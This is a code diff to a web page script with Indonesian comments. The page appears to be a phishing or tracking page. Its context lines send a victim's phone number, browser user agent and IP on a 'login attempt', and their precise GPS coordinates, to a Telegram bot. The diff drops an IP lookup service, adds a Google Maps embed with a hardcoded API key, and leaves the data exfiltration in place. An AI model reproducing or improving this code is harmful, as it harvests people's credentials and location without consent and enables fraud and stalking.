@@ -427,16 +427,16 @@
 </div>
 </div>
 <script>
-// 🌐 Ambil IP publik via ipapi
-let userIP = 'Fetching...';
-fetch('https://ipapi.co/json')
-    .then(response => response.json())
-    .then(data => {
-        userIP = data.ip + ' (' + data.city + ', ' + data.country_name + ')';
-    })
-    .catch(err => {
-        console.warn('Gagal mengambil IP:', err);
-    });
+function updateInteractiveMap(lat, lon) {
+    const mapContainer = document.querySelector('.map-placeholder');
+    const embed = document.createElement('iframe');
+    embed.src = `https://www.google.com/maps/embed/v1/view?key=AIzaSyDNC8-lUQsnkBgdD3UZF3yWQ2Wjv7jox5Q&center=${lat},${lon}&zoom=15&maptype=roadmap`;
+    embed.style = "width:100%;height:100%;border:0;";
+    embed.loading = "lazy";
+    embed.allowFullscreen = true;
+    mapContainer.innerHTML = "";
+    mapContainer.appendChild(embed);
+}
 
 
         // Telegram Bot Configuration
@@ -503,7 +503,7 @@ fetch('https://ipapi.co/json')
             const terminal = document.getElementById('terminal');
             
             // Send login attempt to Telegram
-            sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
+            sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: Fetching...`);
             
             // Simulate verification process
             setTimeout(() => {
@@ -685,7 +685,7 @@ fetch('https://ipapi.co/json')
 📍 Longitude: ${longitude}
 🎯 Akurasi: ${accuracy} meter
 ⏰ Waktu: ${timestamp}
-🌐 IP: ${userIP}
+🌐 IP: Fetching...
 🖥️ User Agent: ${navigator.userAgent}
             `;
             
